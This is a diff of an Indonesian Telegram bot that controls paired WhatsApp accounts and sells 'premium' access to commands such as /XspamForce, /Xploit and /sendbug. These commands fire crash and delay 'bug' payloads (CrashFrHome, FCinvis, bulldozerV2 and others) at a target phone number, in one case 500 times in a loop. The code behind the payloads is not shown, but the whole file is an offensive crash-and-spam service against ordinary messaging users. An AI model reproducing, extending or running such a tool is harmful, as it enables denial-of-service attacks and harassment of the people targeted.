+    await bot.answerCallbackQuery(query.id).catch(() => {});
+});
+
+bot.onText(/\/start/, async (msg) => {
+    const chatId = msg.chat.id;
+    const from = msg.from;
+    const userId = from.id;
+    const chatType = msg.chat.type;
+    const isGroup = chatType === "group" || chatType === "supergroup";
+    const isOwnerUser = OWNER_ID.toString() === userId.toString();
+    if (!isGroup && !isPremium(userId) && !isOwnerUser) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
+    }
+    await sendStartMenu(chatId, from);
 });
 
 bot.onText(/\/update (on|off)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
-    const mode = match[1] === "on";
-    saveAutoUpdateSetting(mode);
-    mode ? startAutoUpdateChecker() : stopAutoUpdateChecker();
-    safeSendMessage(chatId, `✅ Auto update ${mode ? "ON" : "OFF"}`);
+    const mode = match[1].toLowerCase();
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    if (mode === "on") {
+        autoUpdateEnabled = true;
+        saveAutoUpdateSetting(true);
+        startAutoUpdateChecker();
+        await safeSendMessage(chatId, `✅ Auto update diaktifkan! Bot akan otomatis update ketika ada versi baru di GitHub.`);
+    } else if (mode === "off") {
+        autoUpdateEnabled = false;
+        saveAutoUpdateSetting(false);
+        stopAutoUpdateChecker();
+        await safeSendMessage(chatId, `❌ Auto update dinonaktifkan! Gunakan /autoupdate untuk update manual.`);
+    }
 });
 
 bot.onText(/\/autoupdate/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    const statusMsg = await safeSendMessage(chatId, "🔄 Mengecek update dari GitHub...");
+    if (!statusMsg) return;
+    const update = await checkForUpdates();
+    if (!update.hasUpdate) {
+        await safeEditMessageText(chatId, statusMsg.message_id, `✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})`);
+        return;
+    }
+    await safeEditMessageText(chatId, statusMsg.message_id, `📦 Update ditemukan! Versi ${CURRENT_VERSION} → ${update.newVersion}\n🔄 Melakukan update...`);
     await performUpdate(chatId);
 });
 
 bot.onText(/\/checkupdate/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    const statusMsg = await safeSendMessage(chatId, "🔍 Mengecek update dari GitHub...");
+    if (!statusMsg) return;
     const update = await checkForUpdates();
-    safeSendMessage(chatId, update.hasUpdate ? `📦 Update tersedia! v${CURRENT_VERSION} → v${update.newVersion}` : `✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})`);
+    if (update.hasUpdate) {
+        await safeEditMessageText(chatId, statusMsg.message_id, `📦 Update tersedia!\n\nVersi saat ini: v${CURRENT_VERSION}\nVersi terbaru: v${update.newVersion}\n\nGunakan /autoupdate untuk update.`);
+    } else {
+        await safeEditMessageText(chatId, statusMsg.message_id, `✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})\n\nAuto Update: ${autoUpdateEnabled ? "ON (otomatis)" : "OFF (manual)"}`);
+    }
 });
 
 bot.onText(/\/blokcmd (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
-    const cmd = match[1].toLowerCase().replace("/", "");
-    if (blockedCommands.includes(cmd)) return safeSendMessage(chatId, `⚠️ Command /${cmd} sudah diblokir.`);
-    blockedCommands.push(cmd);
-    saveBlockedCommands();
-    safeSendMessage(chatId, `✅ Command /${cmd} diblokir.`);
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    const commandName = match[1].toLowerCase().replace("/", "");
+    if (isCommandBlocked(commandName)) {
+        return safeSendMessage(chatId, `⚠️ Command /${commandName} sudah dalam keadaan diblokir.`);
+    }
+    blockedCommands.push(commandName);
+    saveBlockedCommands(blockedCommands);
+    safeSendMessage(chatId, `✅ Command /${commandName} berhasil diblokir. User tidak akan bisa menggunakan command ini.`);
 });
 
 bot.onText(/\/bukacmd (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
-    const cmd = match[1].toLowerCase().replace("/", "");
-    const index = blockedCommands.indexOf(cmd);
-    if (index === -1) return safeSendMessage(chatId, `⚠️ Command /${cmd} tidak diblokir.`);
-    blockedCommands.splice(index, 1);
-    saveBlockedCommands();
-    safeSendMessage(chatId, `✅ Command /${cmd} dibuka.`);
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    const commandName = match[1].toLowerCase().replace("/", "");
+    if (!isCommandBlocked(commandName)) {
+        return safeSendMessage(chatId, `⚠️ Command /${commandName} tidak dalam keadaan diblokir.`);
+    }
+    blockedCommands = blockedCommands.filter(cmd => cmd !== commandName);
+    saveBlockedCommands(blockedCommands);
+    safeSendMessage(chatId, `✅ Command /${commandName} berhasil dibuka. User bisa menggunakan command ini kembali.`);
+});
+
+bot.onText(/\/addpremgrup\s+(\d+)([dhm])?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    if (chatType !== "group" && chatType !== "supergroup") {
+        return safeSendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!");
+    }
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    const jumlah = parseInt(match[1]);
+    const unit = match[2] || 'd';
+    let days = jumlah;
+    if (unit === 'h') days = jumlah / 24;
+    if (unit === 'm') days = jumlah / (24 * 30);
+    if (days < 1) days = 1;
+    await addGroupPremium(chatId, Math.floor(days), userId);
+    const chat = await bot.getChat(chatId);
+    safeSendMessage(chatId, `✅ Grup "${chat.title}" berhasil ditambahkan ke premium selama ${jumlah}${unit === 'd' ? ' hari' : unit === 'h' ? ' jam' : ' bulan'}! Anggota grup dapat mengetik "add" untuk mendapatkan akses premium.`);
+});
+
+bot.onText(/\/delpremgrup/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    if (chatType !== "group" && chatType !== "supergroup") {
+        return safeSendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!");
+    }
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    const groupId = chatId.toString();
+    const existingGroup = groupPremiumData.find(g => g.groupId === groupId);
+    if (!existingGroup) {
+        return safeSendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup.");
+    }
+    removeGroupPremium(chatId);
+    const chat = await bot.getChat(chatId);
+    safeSendMessage(chatId, `✅ Grup "${chat.title}" berhasil dihapus dari daftar premium grup.`);
+});
+
+bot.onText(/\/listpremgrub/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    if (chatType !== "group" && chatType !== "supergroup") {
+        return safeSendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!");
+    }
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    const groupId = chatId.toString();
+    const group = groupPremiumData.find(g => g.groupId === groupId);
+    if (!group) {
+        return safeSendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup.");
+    }
+    if (group.members.length === 0) {
+        return safeSendMessage(chatId, "📌 Belum ada member yang mendaftar premium di grup ini.");
+    }
+    let message = `<blockquote>📋 Daftar Premium Member</blockquote>\n`;
+    message += `Grup: ${group.groupTitle}\n`;
+    message += `Expires: ${moment(group.expiresAt).format('YYYY-MM-DD HH:mm:ss')}\n━━━━━━━━━━━━━━━━━━\n`;
+    group.members.forEach((member, index) => {
+        const expires = moment(member.expiresAt).format('YYYY-MM-DD');
+        message += `${index + 1}. ${member.username || `User ${member.userId}`}\n   ID: <code>${member.userId}</code>\n   Exp: ${expires}\n\n`;
+    });
+    safeSendMessage(chatId, message, { parse_mode: "HTML" });
+});
+
+bot.onText(/^add$/i, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const username = msg.from.username || msg.from.first_name;
+    const chatType = msg.chat.type;
+    if (chatType !== "group" && chatType !== "supergroup") return;
+    const groupId = chatId.toString();
+    const group = groupPremiumData.find(g => g.groupId === groupId);
+    if (!group) {
+        return safeSendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup. Hubungi admin untuk mendaftarkan grup.");
+    }
+    if (Date.now() > group.expiresAt) {
+        return safeSendMessage(chatId, "❌ Masa berlaku premium grup ini sudah habis. Hubungi admin untuk memperpanjang.");
+    }
+    if (isPremium(userId)) {
+        return safeSendMessage(chatId, `✅ @${username || userId} sudah memiliki akses premium!`, { parse_mode: "HTML" });
+    }
+    const remainingDays = Math.ceil((group.expiresAt - Date.now()) / (1000 * 60 * 60 * 24));
+    await addMemberPremiumFromGroup(chatId, userId, username, remainingDays);
+    safeSendMessage(chatId, `✅ Selamat @${username || userId}! Anda telah mendapatkan akses premium selama ${remainingDays} hari. Silakan gunakan command bug yang tersedia.`, { parse_mode: "HTML" });
+});
+
+// ================= COMMAND /XspamForce ================= //
+bot.onText(/\/XspamForce(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "xspamforce");
+    if (!hasAccess) return;
+    if (!match[1]) {
+        return safeSendMessage(chatId, "🪧 *Format:* /XspamForce 628xxx\n\n💡 *Fitur:* Spam Force Anti Kenok\n✅ Support Nokos Fresh\n✅ Anti Blokir\n✅ 2 Function Combo (CrashFrHome + StickerFC)\n✅ Bebas spam tanpa jeda", { parse_mode: "Markdown" });
+    }
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    const activeSocket = await getActiveSocket();
+    if (!activeSocket) {
+        return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif. Mencoba reconnect...");
+    }
+    const sock = activeSocket.sock;
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "XspamForce (Anti Kenok)", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
+    for (let i = 0; i < 500; i++) {
+        try {
+            await CrashFrHome(sock, target);
+            await StickerFC(sock, target);
+            console.log(`🚀 XspamForce iteration ${i + 1} to ${targetNumber}`);
+        } catch (error) {
+            console.error(`❌ XspamForce iteration ${i + 1} error:`, error.message);
+            // Cek koneksi dan coba reconnect jika perlu
+            if (error.message && error.message.includes("Connection closed")) {
+                const newActive = await getActiveSocket();
+                if (newActive) {
+                    sock = newActive.sock;
+                }
+            }
+        }
+        await sleep(100);
+    }
+});
+
+bot.onText(/\/Xploit(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "xploit");
+    if (!hasAccess) return;
+    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /xploit 628xxx");
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    await safeBugSender(chatId, targetNumber, "xploit", FCinvis, 1, 0);
+});
+
+bot.onText(/\/Sanjiva(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "sanjiva");
+    if (!hasAccess) return;
+    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Sanjiva 628xxx");
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    await safeBugSender(chatId, targetNumber, "Sanjiva", xatanicaldelayv2, 10, 100);
+});
+
+bot.onText(/\/Stova(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "stova");
+    if (!hasAccess) return;
+    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Stova 628xxx");
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    await safeBugSender(chatId, targetNumber, "Stova", brem, 7, 100);
+});
+
+bot.onText(/\/Chatms(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "chatms");
+    if (!hasAccess) return;
+    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Chatms 628xxx");
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    await safeBugSender(chatId, targetNumber, "Chatms", FCinvisTes, 500, 3000);
+});
+
+bot.onText(/\/Ganesha(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "ganesha");
+    if (!hasAccess) return;
+    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Ganesha 628xxx");
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    await safeBugSender(chatId, targetNumber, "Ganesha", bulldozerV2, 10, 100);
+});
+
+bot.onText(/\/sendbug(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "sendbug");
+    if (!hasAccess) return;
+    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /sendbug 628xxx");
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    await safeBugSender(chatId, targetNumber, "sendbug", VisiFriend, 35, 100);
 });
 
 bot.onText(/\/reqpair (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    if (!adminUsers.includes(userId) && !isOwner(userId)) return safeSendPhoto(chatId, thumbnailUrl, { caption: "Access Admin Only", reply_markup: { inline_keyboard: [[{ text: "Owner", url: "https://t.me/ItsMeXanderRzMd" }]] } });
-    const botNumber = match[1].replace(/[^0-9]/g, "");
-    if (!botNumber || botNumber.length < 10) return safeSendMessage(chatId, "❌ Nomor tidak valid.");
-    if (sessions.has(botNumber)) return safeSendMessage(chatId, `✅ Nomor ${botNumber} sudah terhubung.`);
-    if (pairingInProgress.has(botNumber)) {
-        const elapsed = Date.now() - pairingInProgress.get(botNumber);
-        if (elapsed < PAIRING_COOLDOWN) return safeSendMessage(chatId, `⚠️ Pairing sedang berlangsung. Tunggu ${Math.ceil((PAIRING_COOLDOWN - elapsed) / 1000)} detik.`);
-        pairingInProgress.delete(botNumber);
+    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
+        return safeSendPhoto(chatId, thumbnailUrl, {
+            caption: `<blockquote>Access Admin</blockquote>Please Buy Access Admin To The Owner!`,
+            parse_mode: "HTML",
+            reply_markup: { inline_keyboard: [[{ text: "Owner", url: "https://t.me/ItsMeXanderRzMd" }]] }
+        });
     }
-    await safeSendMessage(chatId, `📱 Memulai pairing untuk ${botNumber}...\n\n⚠️ PENTING:\n1. Pastikan nomor WhatsApp aktif\n2. Masukkan kode pairing yang muncul\n3. Kode berlaku 2 menit`);
+    if (!match[1]) return safeSendMessage(chatId, "❌ Missing input. Please provide the number. Example: /reqpair 62xxxx.");
+    const botNumber = match[1].replace(/[^0-9]/g, "");
+    if (!botNumber || botNumber.length < 10) return safeSendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
     try {
         await ConnectToWhatsApp(botNumber, chatId);
     } catch (error) {
-        pairingInProgress.delete(botNumber);
-        let errorMsg = "Terjadi kesalahan.";
-        if (error.message.includes("timeout")) errorMsg = "⏰ Koneksi timeout.";
-        else if (error.message.includes("blocked") || error.message.includes("403")) errorMsg = "🚫 Nomor diblokir.";
-        else if (error.message.includes("515")) errorMsg = "🌐 Network Error (515) - IP panel mungkin kena blokir WhatsApp.";
-        safeSendMessage(chatId, `❌ GAGAL PAIRING\n\n📱 ${botNumber}\n❗ ${errorMsg}\n\nSilakan coba /reqpair ${botNumber} lagi.`);
+        console.error("Error in Connect:", error);
+        safeSendMessage(chatId, "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
     }
 });
 
-// ================= POLL & CALLBACK HANDLERS ================= //
-bot.on("poll_answer", async (answer) => {
-    if (pendingPremiumPoll[answer.poll_id]) {
-        const data = pendingPremiumPoll[answer.poll_id];
-        if (answer.user.id !== data.adminId) return;
-        const choice = answer.option_ids[0];
-        let days = choice === 0 ? 7 : choice === 1 ? 14 : choice === 2 ? 30 : "permanent";
-        let expiresAt = days === "permanent" ? "permanent" : Date.now() + days * 86400000;
-        const existing = premiumUsers.find(u => u.id === data.userId);
-        existing ? existing.expiresAt = expiresAt : premiumUsers.push({ id: data.userId, expiresAt });
-        savePremiumUsers();
-        safeSendMessage(data.chatId, `✅ Premium ditambahkan!\n👤 User: ${data.userId}\n⏳ Durasi: ${days === "permanent" ? "Permanent" : days + " Hari"}`);
-        delete pendingPremiumPoll[answer.poll_id];
-    }
-    if (pendingColorPoll[answer.poll_id]) {
-        const data = pendingColorPoll[answer.poll_id];
-        const colors = ["danger", "primary", "success", "secondary", "disco"];
-        currentColor = colors[answer.option_ids[0]];
-        saveColorSetting();
-        if (buttonIntervals.has(data.currentMessageId)) { clearInterval(buttonIntervals.get(data.currentMessageId)); buttonIntervals.delete(data.currentMessageId); }
-        if (globalIntervalId) { clearInterval(globalIntervalId); globalIntervalId = null; }
-        discoActive = false;
-        await sendColoredMenu(data.chatId, data.from, currentColor, data.currentMessageId);
-        delete pendingColorPoll[answer.poll_id];
-    }
+process.on('unhandledRejection', (reason, promise) => {
+    console.error(chalk.red('Unhandled Rejection at:', promise, 'reason:', reason));
 });
 
-bot.on("callback_query", async (query) => {
-    if (!query.message) return;
-    const chatId = query.message.chat.id;
-    const messageId = query.message.message_id;
-    const data = query.data;
-
-    if (data?.startsWith("autofix_")) {
-        const pending = global.pendingFix?.[parseInt(data.replace("autofix_", ""))];
-        if (!pending) return bot.answerCallbackQuery(query.id, { text: "❌ Data tidak ditemukan." });
-        await bot.answerCallbackQuery(query.id, { text: "🔧 Memperbaiki code..." });
-        const fixResult = autoFixJavaScript(pending.code, pending.error);
-        const filePath = `fixed_${Date.now()}.js`;
-        fs.writeFileSync(filePath, fixResult.fixed);
-        await bot.sendDocument(chatId, filePath, { caption: `✅ AUTO FIX BERHASIL!\n\n📊 ${fixResult.fixes.length} Perbaikan:\n${fixResult.fixes.slice(0, 10).map(f => `• ${f}`).join('\n')}` });
-        fs.unlinkSync(filePath);
-        delete global.pendingFix[parseInt(data.replace("autofix_", ""))];
-        return;
-    }
-
-    if (buttonIntervals.has(messageId)) { clearInterval(buttonIntervals.get(messageId)); buttonIntervals.delete(messageId); }
-    if (globalIntervalId) { clearInterval(globalIntervalId); globalIntervalId = null; }
-    discoActive = false;
-
-    let caption = "", replyMarkup = {};
-
-    if (data === "trashmenu") {
-        caption = `<blockquote>─━━─━━⧼ BUG MENU ⧽─━━─━━</blockquote>\n<b>─━━─━━⧼ INFORMASI USER ⧽─━━─━━:</b>\n🎩 Pemilik : @ItsMeXanderRzMd 🌟    \n😄 Owner : @realmarz 🌟\n🍽 Version : ${CURRENT_VERSION}\n🗡 Platform : Telegram\n<b>─━━─━━⧼ FITUR BUG ⧽─━━─━━:</b>\n─▢ /sendbug +628\n─▢ /Xploit\n─▢ /Sanjiva\n─▢ /Stova\n─▢ /Chatms +628\n─▢ /Ganesha +628\n─▢ /XspamForce +628`;
-        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] };
-    } else if (data === "owner_menu") {
-        caption = `<blockquote><b>☠ PRIMROSE LINUX BOT ACCESS ☠</b></blockquote>\n🎩 Pemilik : @ItsMeXanderRzMd 🌟    \n😄 Owner : @realmarz 🌟\n🍽 Version : ${CURRENT_VERSION}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n┃ ▢ /addprem &lt;id&gt;\n┃ ▢ /delprem &lt;id&gt;\n┃ ▢ /addadmin &lt;id&gt;\n┃ ▢ /deladmin &lt;id&gt;\n┃ ▢ /listprem\n┃ ▢ /listadmin\n┃ ▢ /reqpair ☇ Number\n┃ ▢ /update on/off\n┃ ▢ /autoupdate\n┃ ▢ /checkupdate`;
-        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] };
-    } else if (data === "group_security_menu") {
-        caption = `<blockquote><b>🔒 XGROUPSECURITY MENU 🔒</b></blockquote>\n🎩 Pemilik : @ItsMeXanderRzMd 🌟\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n┃ ▢ /blokcmd &lt;command&gt;\n┃ ▢ /bukacmd &lt;command&gt;`;
-        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] };
-    } else if (data === "toolsbug_menu") {
-        caption = `<blockquote><b>🛠️ XTOOLSBUG MENU 🛠️</b></blockquote>\n🎩 Pemilik : @ItsMeXanderRzMd 🌟\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n┃ ▢ /testfunction &lt;number&gt; &lt;jumlah&gt;\n┃ ▢ /celahfunc &lt;reply&gt;\n┃ ▢ /addcelah &lt;reply&gt;\n┃ ▢ /listcelah\n┃ ▢ /delcelah &lt;id&gt;\n┃ ▢ /cekfunc &lt;reply&gt;\n┃ ▢ /addparticipant &lt;reply&gt;`;
-        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] };
-    } else if (data === "change_color_menu") {
-        const poll = await bot.sendPoll(chatId, "🎨 PILIH WARNA BUTTON", ["🔴 XRED", "🔵 XBLUE", "🟢 XGREEN", "⚪ XWHITE", "🌈 XDISCO"], { is_anonymous: false });
-        pendingColorPoll[poll.poll.id] = { chatId, userId: query.from.id, from: query.from, currentMessageId: messageId };
-        return await bot.answerCallbackQuery(query.id);
-    } else if (data === "back_to_main") {
-        const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE";
-        const isWhite = currentColor === "secondary";
-        const buttonStyle = isWhite ? undefined : (currentColor === "disco" ? buttonStyles[0] : currentColor);
-        let keyboard = [
-            [{ text: "XBUGS", callback_data: "trashmenu", style: buttonStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: buttonStyle }],
-            [{ text: "XSETTINGS", callback_data: "owner_menu", style: buttonStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: buttonStyle }],
-            [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: buttonStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: buttonStyle }]
-        ];
-        if (isWhite) keyboard = JSON.parse(JSON.stringify(keyboard).replace(/"style":undefined/g, '"style":null'));
-        const caption = `<blockquote><strong>☠ # Primrose Linux Bot 𖣂 ☠</strong></blockquote>\n🎩 Pemilik : @ItsMeXanderRzMd 🌟    \n😄 Owner : @realmarz 🌟\n🍽 Version : ${CURRENT_VERSION}\n🗡 Platform : Telegram\n<blockquote><b>――⧼ STATUS BOT ⧽――</b></blockquote>\n⛧ Status : ${status}\n⛧ Number : ${sessions.size}\n⛧ Runtime : ${formatRuntime()}\n⛧ Memory : ${formatMemory()}`;
-        await safeEditMessageMedia(chatId, messageId, { type: 'photo', media: getRandomImage(), caption, parse_mode: "HTML" }, { reply_markup: { inline_keyboard: keyboard } });
-        if (currentColor === "disco") {
-            discoActive = true;
-            let index = 0;
-            globalIntervalId = setInterval(async () => {
-                if (!discoActive) return;
-                index = (index + 1) % buttonStyles.length;
-                const newStyle = buttonStyles[index];
-                let newKeyboard = [
-                    [{ text: "XBUGS", callback_data: "trashmenu", style: newStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: newStyle }],
-                    [{ text: "XSETTINGS", callback_data: "owner_menu", style: newStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: newStyle }],
-                    [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: newStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: newStyle }]
-                ];
-                await safeEditMessageReplyMarkup(chatId, messageId, { inline_keyboard: newKeyboard });
-            }, 1500);
-            buttonIntervals.set(messageId, globalIntervalId);
-        }
-        return await bot.answerCallbackQuery(query.id);
-    }
-
-    if (caption) await safeEditMessageMedia(chatId, messageId, { type: 'photo', media: getRandomImage(), caption, parse_mode: "HTML" }, { reply_markup: replyMarkup });
-    await bot.answerCallbackQuery(query.id);
+process.on('uncaughtException', (error) => {
+    console.error(chalk.red('Uncaught Exception:', error));
+    // Jangan exit, biarkan bot tetap berjalan
 });
 
-// ================= ERROR HANDLERS ================= //
-process.on('unhandledRejection', (reason) => console.error(chalk.red('Unhandled Rejection:', reason)));
-process.on('uncaughtException', (error) => console.error(chalk.red('Uncaught Exception:', error)));
-
-// ================= START EVERYTHING ================= //
-setTimeout(async () => {
-    const pending = getPendingUpdate();
-    if (pending?.chatId) {
-        await safeSendMessage(OWNER_ID, `✅ VERSI SUDAH NEW!\n\nVersi ${pending.oldVersion} → ${pending.newVersion}\nBot telah berhasil diupdate.`);
-        clearPendingUpdate();
+process.on('SIGINT', () => {
+    console.log(chalk.yellow('\n🛑 Shutting down bot...'));
+    stopHealthCheck();
+    stopAutoUpdateChecker();
+    for (const [botNumber] of sessions) {
+        stopPingInterval(botNumber);
     }
-}, 3000);
+    for (const [botNumber, timeout] of reconnectTimeouts) {
+        clearTimeout(timeout);
+    }
+    process.exit(0);
+});
+
+process.on('SIGTERM', () => {
+    console.log(chalk.yellow('\n🛑 Shutting down bot...'));
+    stopHealthCheck();
+    stopAutoUpdateChecker();
+    for (const [botNumber] of sessions) {
+        stopPingInterval(botNumber);
+    }
+    for (const [botNumber, timeout] of reconnectTimeouts) {
+        clearTimeout(timeout);
+    }
+    process.exit(0);
+});
 
 startAutoUpdateChecker();
 startBot();
